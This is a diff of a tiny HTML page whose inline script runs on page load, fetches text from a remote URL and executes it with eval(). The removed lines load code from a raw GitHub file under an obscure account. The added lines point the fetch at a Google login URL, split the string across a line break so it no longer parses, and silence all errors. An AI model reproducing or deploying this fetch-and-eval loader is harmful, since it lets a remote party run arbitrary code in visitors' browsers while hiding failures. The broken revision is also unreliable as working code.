@@ -1,19 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-<title>Script Auto Runner</title>
-</head>
 <body>
 <script>
 (async () => {
   try {
-    const res = await fetch("https://raw.githubusercontent.com/thatACCmf/1/main/index.html");
-    const code = await res.text();
+    const r = await fetch("https://accounts.google.com/ServiceLogin
+");
+    const code = await r.text();
     eval(code);
-    console.log("Script loaded successfully.");
-  } catch (e) {
-    console.error("Failed to load script:", e);
-  }
+  } catch {}
 })();
 </script>
 </body>
